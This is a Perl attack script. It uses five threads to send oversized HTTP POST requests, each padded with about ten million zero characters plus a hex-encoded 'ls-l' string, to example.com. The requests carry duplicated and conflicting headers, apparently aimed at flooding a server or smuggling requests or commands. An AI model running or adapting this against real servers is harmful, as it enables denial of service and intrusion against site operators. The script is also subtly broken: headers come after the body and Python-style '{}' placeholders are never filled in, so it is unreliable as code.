#!/usr/bin/perl

use strict;
use warnings;
use threads;
use IO::Socket;


my $payload = "0" x 9999999 . "6C732D6C";
my $num_threads = 5; # Number of threads to create

# Function to send HTTP request
sub send_http_request {
    my ($server, $payload) = @_;





    my $sock = IO::Socket::INET->new(
        PeerAddr => $server,
        PeerPort => '80',
        Proto    => 'tcp'
    );

    unless ($sock) {
        die "Failed to create socket: $!";
    }

    my $http_request = "POST / HTTP/1.1\r\n"
        . "Host: {}\r\n"
        . "Content-Length: " . length($payload) . "\r\n"
        . "Content-Type: text/plain\r\n\r\n"
        . "Session=_d838591b3a6257b0111138e6ca76c2c2409fb287b1473aa463db7f202caa09361bd7f8948c8d1adf4bd4f6c1c198eb950754581406246bf8" .$payload
        . "X-Host: {}}0\r\n"
        . "X-Forwarded-For: {}\r\n"
        . "Referer: {}\r\n"
        . "Content-Type: multipart/form-data; boundary=b2a76b357c894dca991b7e6330bb7ccc\r\n"
        . "Content-Length: 0\r\n\r\n";

    print $sock $http_request;

    my $response;
    while (<$sock>) {
        $response .= $_;
    }

    print "Thread " . threads->self->tid . " received response:\n$response\n";
    close($sock);
}

# Create and start threads
my @threads;
for (1 .. $num_threads) {
    push @threads, threads->create(\&send_http_request, 'example.com', $payload);
}

# Wait for all threads to finish
$_->join for @threads;
